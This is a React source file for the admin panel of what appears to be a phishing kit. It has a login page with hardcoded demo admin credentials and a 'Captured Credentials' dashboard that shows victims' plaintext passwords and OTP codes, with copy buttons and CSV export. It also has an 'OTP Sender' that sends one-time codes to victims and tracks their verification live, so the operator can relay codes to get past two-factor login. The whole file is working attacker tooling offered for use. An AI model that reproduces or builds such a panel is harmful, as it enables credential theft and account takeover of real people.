/**
 * COMPLETE ADMIN PANEL CODE
 * =========================
 * Login, Dashboard, Credentials, OTP Sender
 * All in one React file
 */

import React, { useState, useEffect } from 'react';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000/api';

// ==================== ADMIN LOGIN ====================

function AdminLogin({ onLogin }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await axios.post(`${API_URL}/admin-auth/login`, {
        email,
        password
      });

      if (response.data.success) {
        localStorage.setItem('adminToken', response.data.token);
        localStorage.setItem('adminData', JSON.stringify(response.data.adminData));
        onLogin(response.data.adminData);
      }
    } catch (err) {
      setError('❌ Invalid email or password');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh', display: 'flex', alignItems: 'center',
      justifyContent: 'center', backgroundColor: '#f5f5f5', fontFamily: 'Arial, sans-serif'
    }}>
      <div style={{
        width: '400px', padding: '40px', backgroundColor: 'white',
        borderRadius: '10px', boxShadow: '0 4px 20px rgba(0,0,0,0.1)'
      }}>
        <div style={{ textAlign: 'center', marginBottom: '30px' }}>
          <h1 style={{ fontSize: '32px' }}>🔐</h1>
          <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginTop: '10px' }}>Admin Login</h2>
        </div>

        {error && (
          <div style={{
            padding: '12px', backgroundColor: '#fee', color: '#c33',
            borderRadius: '5px', marginBottom: '20px', border: '1px solid #fcc'
          }}>
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <input
            type="email"
            placeholder="admin@creatorhub.com"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            style={{
              width: '100%', padding: '12px', marginBottom: '15px',
              border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box'
            }}
            required
          />

          <input
            type="password"
            placeholder="Enter password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={{
              width: '100%', padding: '12px', marginBottom: '20px',
              border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box'
            }}
            required
          />

          <button
            type="submit"
            disabled={loading}
            style={{
              width: '100%', padding: '12px', backgroundColor: loading ? '#ccc' : '#007bff',
              color: 'white', border: 'none', borderRadius: '5px', fontWeight: 'bold',
              cursor: loading ? 'not-allowed' : 'pointer'
            }}
          >
            {loading ? 'Logging in...' : 'Login'}
          </button>
        </form>

        <div style={{
          marginTop: '20px', padding: '12px', backgroundColor: '#e7f3ff',
          borderRadius: '5px', fontSize: '12px', color: '#004085'
        }}>
          <strong>Demo:</strong>
          <p>Email: admin@creatorhub.com</p>
          <p>Pass: Admin@123456</p>
        </div>
      </div>
    </div>
  );
}

// ==================== CREDENTIALS LIST ====================

function CredentialList({ credentials, loading }) {
  const [expandedId, setExpandedId] = useState(null);

  const exportToCSV = () => {
    const headers = ['Email', 'Password', 'OTP', 'OTP Status', 'Verified At', 'Timestamp'];
    const rows = credentials.map(c => [
      c.email,
      c.passwordOriginal,
      c.otp || 'N/A',
      c.otpStatus,
      c.verifiedAt ? new Date(c.verifiedAt).toLocaleString() : 'N/A',
      new Date(c.timestamp).toLocaleString()
    ]);

    let csv = headers.join(',') + '\n';
    rows.forEach(row => {
      csv += row.map(cell => `"${cell}"`).join(',') + '\n';
    });

    const element = document.createElement('a');
    element.setAttribute('href', 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv));
    element.setAttribute('download', `credentials_${new Date().toISOString().split('T')[0]}.csv`);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
  };

  if (loading) return <div style={{ padding: '20px' }}>Loading...</div>;

  return (
    <div style={{
      backgroundColor: 'white', padding: '20px', borderRadius: '10px',
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
    }}>
      <h2 style={{ marginBottom: '20px', fontSize: '24px', fontWeight: 'bold' }}>
        📋 Captured Credentials ({credentials.length})
      </h2>

      <button
        onClick={exportToCSV}
        style={{
          marginBottom: '20px', padding: '10px 20px', backgroundColor: '#28a745',
          color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold'
        }}
      >
        📥 Export to CSV
      </button>

      {credentials.length === 0 ? (
        <div style={{ textAlign: 'center', padding: '40px', color: '#666' }}>
          No credentials captured yet
        </div>
      ) : (
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '20px' }}>
            <thead>
              <tr style={{ backgroundColor: '#f5f5f5' }}>
                <th style={{ padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' }}>Email</th>
                <th style={{ padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' }}>Password</th>
                <th style={{ padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' }}>OTP</th>
                <th style={{ padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' }}>Status</th>
                <th style={{ padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' }}>Verified</th>
                <th style={{ padding: '12px', textAlign: 'center', borderBottom: '2px solid #ddd' }}>Action</th>
              </tr>
            </thead>
            <tbody>
              {credentials.map((credential) => (
                <React.Fragment key={credential._id}>
                  <tr style={{ borderBottom: '1px solid #ddd' }}>
                    <td style={{ padding: '12px', fontFamily: 'monospace', fontSize: '12px' }}>
                      {credential.email}
                    </td>
                    <td style={{ padding: '12px', fontFamily: 'monospace', color: '#c33', fontWeight: 'bold' }}>
                      ●●●●●●●●
                    </td>
                    <td style={{ padding: '12px', fontFamily: 'monospace', color: '#0066cc', fontWeight: 'bold' }}>
                      {credential.otp || 'Pending'}
                    </td>
                    <td style={{ padding: '12px' }}>
                      <span style={{
                        padding: '5px 10px',
                        backgroundColor: credential.otpStatus === 'Verified' ? '#d4edda' : '#fff3cd',
                        color: credential.otpStatus === 'Verified' ? '#155724' : '#856404',
                        borderRadius: '5px', fontSize: '12px', fontWeight: 'bold'
                      }}>
                        {credential.otpStatus}
                      </span>
                    </td>
                    <td style={{ padding: '12px', fontSize: '12px' }}>
                      {credential.verifiedAt ? (
                        <span style={{ color: '#28a745', fontWeight: 'bold' }}>
                          ✅ {new Date(credential.verifiedAt).toLocaleString()}
                        </span>
                      ) : (
                        <span style={{ color: '#666' }}>-</span>
                      )}
                    </td>
                    <td style={{ padding: '12px', textAlign: 'center' }}>
                      <button
                        onClick={() => setExpandedId(expandedId === credential._id ? null : credential._id)}
                        style={{
                          padding: '6px 12px',
                          backgroundColor: expandedId === credential._id ? '#dc3545' : '#007bff',
                          color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer',
                          fontSize: '12px', fontWeight: 'bold'
                        }}
                      >
                        {expandedId === credential._id ? '▼ Hide' : '▶ View'}
                      </button>
                    </td>
                  </tr>

                  {expandedId === credential._id && (
                    <tr style={{ backgroundColor: '#f9f9f9', borderBottom: '2px solid #ddd' }}>
                      <td colSpan="6" style={{ padding: '20px' }}>
                        <div style={{
                          backgroundColor: 'white', padding: '20px', borderRadius: '8px', border: '1px solid #ddd'
                        }}>
                          <h3 style={{ marginBottom: '15px' }}>📋 Full Details</h3>

                          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', marginBottom: '20px' }}>
                            <div>
                              <label style={{ fontWeight: 'bold', color: '#666' }}>Email:</label>
                              <p style={{
                                fontFamily: 'monospace', padding: '8px', backgroundColor: '#f5f5f5',
                                borderRadius: '5px', marginTop: '5px'
                              }}>
                                {credential.email}
                              </p>
                            </div>

                            <div>
                              <label style={{ fontWeight: 'bold', color: '#666' }}>Password:</label>
                              <p style={{
                                fontFamily: 'monospace', padding: '8px', backgroundColor: '#ffe6e6',
                                borderRadius: '5px', marginTop: '5px', color: '#c33', fontWeight: 'bold'
                              }}>
                                {credential.passwordOriginal}
                              </p>
                            </div>

                            <div>
                              <label style={{ fontWeight: 'bold', color: '#666' }}>OTP Code:</label>
                              <p style={{
                                fontFamily: 'monospace', padding: '8px', backgroundColor: '#e6f2ff',
                                borderRadius: '5px', marginTop: '5px', color: '#0066cc',
                                fontSize: '24px', letterSpacing: '5px', fontWeight: 'bold', textAlign: 'center'
                              }}>
                                {credential.otp || 'N/A'}
                              </p>
                            </div>

                            <div>
                              <label style={{ fontWeight: 'bold', color: '#666' }}>Status:</label>
                              <p style={{
                                padding: '8px',
                                backgroundColor: credential.otpStatus === 'Verified' ? '#d4edda' : '#fff3cd',
                                color: credential.otpStatus === 'Verified' ? '#155724' : '#856404',
                                borderRadius: '5px', marginTop: '5px', fontWeight: 'bold', textAlign: 'center'
                              }}>
                                {credential.otpStatus === 'Verified' ? '✅' : '⏳'} {credential.otpStatus}
                              </p>
                            </div>
                          </div>

                          <div style={{
                            display: 'flex', gap: '10px',
                            borderTop: '1px solid #ddd', paddingTop: '15px'
                          }}>
                            <CopyButton text={credential.email} label="Copy Email" />
                            <CopyButton text={credential.passwordOriginal} label="Copy Password" />
                            <CopyButton text={credential.otp} label="Copy OTP" />
                          </div>
                        </div>
                      </td>
                    </tr>
                  )}
                </React.Fragment>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// Copy Button Helper
function CopyButton({ text, label }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      style={{
        flex: 1, padding: '8px 12px',
        backgroundColor: copied ? '#28a745' : '#6c757d',
        color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer',
        fontSize: '12px', fontWeight: 'bold'
      }}
    >
      {copied ? '✅ Copied!' : `📋 ${label}`}
    </button>
  );
}

// ==================== OTP SENDER ====================

function OTPSender({ credentials }) {
  const [selectedEmail, setSelectedEmail] = useState('');
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [otpHistory, setOtpHistory] = useState([]);

  useEffect(() => {
    const interval = setInterval(fetchOtpHistory, 3000);
    return () => clearInterval(interval);
  }, [selectedEmail]);

  const fetchOtpHistory = async () => {
    if (!selectedEmail) return;
    try {
      const response = await axios.get(`${API_URL}/admin/credentials`);
      const credential = response.data.find(c => c.email === selectedEmail);
      if (credential) {
        setOtpHistory(credential);
      }
    } catch (error) {
      console.error('Error fetching OTP history:', error);
    }
  };

  const generateOTP = () => {
    const newOTP = Math.floor(100000 + Math.random() * 900000).toString();
    setOtp(newOTP);
  };

  const sendOTP = async () => {
    if (!selectedEmail || !otp) {
      setMessage('❌ Please select email and generate OTP');
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API_URL}/otp/send`, { email: selectedEmail });
      if (response.data.success) {
        setMessage(`✅ OTP sent to ${selectedEmail}`);
        setSelectedEmail('');
        setOtp('');
        setTimeout(() => fetchOtpHistory(), 1000);
      }
    } catch (error) {
      setMessage('❌ Failed to send OTP');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
      {/* OTP Sender */}
      <div style={{
        backgroundColor: 'white', padding: '20px', borderRadius: '10px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
      }}>
        <h2 style={{ marginBottom: '20px', fontSize: '24px', fontWeight: 'bold' }}>
          📤 Send OTP to User
        </h2>

        {message && (
          <div style={{
            padding: '12px', marginBottom: '20px',
            backgroundColor: message.includes('✅') ? '#d4edda' : '#f8d7da',
            color: message.includes('✅') ? '#155724' : '#721c24',
            borderRadius: '5px', border: message.includes('✅') ? '1px solid #c3e6cb' : '1px solid #f5c6cb'
          }}>
            {message}
          </div>
        )}

        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold' }}>
            Select User Email:
          </label>
          <select
            value={selectedEmail}
            onChange={(e) => {
              setSelectedEmail(e.target.value);
              fetchOtpHistory();
            }}
            style={{
              width: '100%', padding: '10px', border: '1px solid #ddd',
              borderRadius: '5px', boxSizing: 'border-box'
            }}
          >
            <option value="">-- Select Email --</option>
            {credentials.map((credential, index) => (
              <option key={index} value={credential.email}>
                {credential.email}
              </option>
            ))}
          </select>
        </div>

        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold' }}>
            📱 OTP Code:
          </label>
          <input
            type="text"
            value={otp}
            readOnly
            style={{
              width: '100%', padding: '12px', border: '2px solid #ddd', borderRadius: '5px',
              boxSizing: 'border-box', fontSize: '20px', letterSpacing: '5px', textAlign: 'center',
              fontWeight: 'bold', backgroundColor: '#f5f5f5'
            }}
            placeholder="Click Generate OTP"
          />
        </div>

        <div style={{ display: 'flex', gap: '10px' }}>
          <button
            onClick={generateOTP}
            style={{
              flex: 1, padding: '12px', backgroundColor: '#28a745', color: 'white',
              border: 'none', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer'
            }}
          >
            🔢 Generate OTP
          </button>
          <button
            onClick={sendOTP}
            disabled={loading}
            style={{
              flex: 1, padding: '12px', backgroundColor: loading ? '#ccc' : '#007bff',
              color: 'white', border: 'none', borderRadius: '5px', fontWeight: 'bold',
              cursor: loading ? 'not-allowed' : 'pointer'
            }}
          >
            {loading ? '⏳ Sending...' : '📧 Send OTP'}
          </button>
        </div>
      </div>

      {/* OTP Tracker */}
      <div style={{
        backgroundColor: 'white', padding: '20px', borderRadius: '10px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
      }}>
        <h2 style={{ marginBottom: '20px', fontSize: '24px', fontWeight: 'bold' }}>
          📊 OTP Tracker
        </h2>

        {selectedEmail ? (
          <div>
            <div style={{ marginBottom: '15px' }}>
              <label style={{ fontWeight: 'bold', color: '#666' }}>User Email:</label>
              <p style={{
                padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '5px',
                marginTop: '5px', fontFamily: 'monospace'
              }}>
                📧 {otpHistory.email || selectedEmail}
              </p>
            </div>

            <div style={{ marginBottom: '15px' }}>
              <label style={{ fontWeight: 'bold', color: '#666' }}>Current OTP:</label>
              <p style={{
                padding: '15px', backgroundColor: '#e6f2ff', borderRadius: '5px', marginTop: '5px',
                fontSize: '28px', letterSpacing: '8px', fontWeight: 'bold', textAlign: 'center',
                color: '#0066cc', fontFamily: 'monospace'
              }}>
                {otpHistory.otp || 'Not Generated'}
              </p>
            </div>

            <div style={{ marginBottom: '15px' }}>
              <label style={{ fontWeight: 'bold', color: '#666' }}>Status:</label>
              <p style={{
                padding: '10px',
                backgroundColor: otpHistory.otpStatus === 'Verified' ? '#d4edda' : '#fff3cd',
                color: otpHistory.otpStatus === 'Verified' ? '#155724' : '#856404',
                borderRadius: '5px', marginTop: '5px', fontWeight: 'bold', textAlign: 'center'
              }}>
                {otpHistory.otpStatus === 'Verified' && '✅ VERIFIED'}
                {otpHistory.otpStatus === 'Generated' && '⏳ PENDING VERIFICATION'}
                {otpHistory.otpStatus === 'Pending' && '⌛ PENDING'}
              </p>
            </div>

            <div style={{ marginBottom: '15px', borderTop: '2px solid #ddd', paddingTop: '15px' }}>
              <h3 style={{ fontWeight: 'bold', marginBottom: '10px' }}>⏰ Timeline</h3>
              <div style={{ fontSize: '12px' }}>
                <div style={{
                  display: 'flex', gap: '10px', marginBottom: '10px', padding: '10px',
                  backgroundColor: otpHistory.otpTimestamp ? '#fff3cd' : '#f5f5f5', borderRadius: '5px'
                }}>
                  <span style={{ minWidth: '20px' }}>📤</span>
                  <div>
                    <strong>OTP Generated:</strong>
                    <p style={{ color: '#666' }}>
                      {otpHistory.otpTimestamp ? new Date(otpHistory.otpTimestamp).toLocaleString() : 'Not generated yet'}
                    </p>
                  </div>
                </div>

                <div style={{
                  display: 'flex', gap: '10px', padding: '10px',
                  backgroundColor: otpHistory.verifiedAt ? '#d4edda' : '#f5f5f5', borderRadius: '5px'
                }}>
                  <span style={{ minWidth: '20px' }}>✅</span>
                  <div>
                    <strong>OTP Verified:</strong>
                    <p style={{ color: '#666' }}>
                      {otpHistory.verifiedAt ? new Date(otpHistory.verifiedAt).toLocaleString() : 'Not verified yet'}
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div style={{
              padding: '8px', backgroundColor: '#e7f3ff', borderRadius: '5px',
              fontSize: '12px', textAlign: 'center', color: '#004085'
            }}>
              🔄 Auto-refreshing every 3 seconds
            </div>
          </div>
        ) : (
          <div style={{ textAlign: 'center', color: '#666', padding: '20px' }}>
            👈 Select an email to view OTP tracker
          </div>
        )}
      </div>
    </div>
  );
}

// ==================== DASHBOARD ====================

function Dashboard({ adminData, onLogout }) {
  const [credentials, setCredentials] = useState([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('credentials');

  useEffect(() => {
    fetchCredentials();
    const interval = setInterval(fetchCredentials, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchCredentials = async () => {
    try {
      const response = await axios.get(`${API_URL}/admin/credentials`);
      setCredentials(response.data);
    } catch (error) {
      console.error('Error fetching credentials:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#f5f5f5' }}>
      {/* Navbar */}
      <nav style={{
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        padding: '20px 40px', backgroundColor: '#333', color: 'white'
      }}>
        <h1>Admin Dashboard</h1>
        <div>
          <span>{adminData.email}</span>
          <button
            onClick={onLogout}
            style={{
              marginLeft: '20px', padding: '8px 16px', backgroundColor: '#dc3545',
              color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer'
            }}
          >
            Logout
          </button>
        </div>
      </nav>

      {/* Tabs */}
      <div style={{ padding: '20px 40px', display: 'flex', gap: '10px' }}>
        <button
          onClick={() => setActiveTab('credentials')}
          style={{
            padding: '10px 20px',
            backgroundColor: activeTab === 'credentials' ? '#007bff' : '#ddd',
            color: activeTab === 'credentials' ? 'white' : 'black',
            border: 'none', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold'
          }}
        >
          Captured Credentials
        </button>
        <button
          onClick={() => setActiveTab('otp')}
          style={{
            padding: '10px 20px',
            backgroundColor: activeTab === 'otp' ? '#007bff' : '#ddd',
            color: activeTab === 'otp' ? 'white' : 'black',
            border: 'none', borderRadius: '5px', cursor: 'pointer', fontWeight: 'bold'
          }}
        >
          Send OTP
        </button>
      </div>

      {/* Content */}
      <div style={{ padding: '20px 40px' }}>
        {activeTab === 'credentials' && <CredentialList credentials={credentials} loading={loading} />}
        {activeTab === 'otp' && <OTPSender credentials={credentials} />}
      </div>
    </div>
  );
}

// ==================== MAIN APP ====================

export default function AdminApp() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [adminData, setAdminData] = useState(null);

  useEffect(() => {
    const savedAdmin = localStorage.getItem('adminData');
    if (savedAdmin) {
      setAdminData(JSON.parse(savedAdmin));
      setIsLoggedIn(true);
    }
  }, []);

  const handleLogin = (data) => {
    setAdminData(data);
    setIsLoggedIn(true);
  };

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    localStorage.removeItem('adminData');
    setIsLoggedIn(false);
    setAdminData(null);
  };

  return !isLoggedIn ? (
    <AdminLogin onLogin={handleLogin} />
  ) : (
    <Dashboard adminData={adminData} onLogout={handleLogout} />
  );
}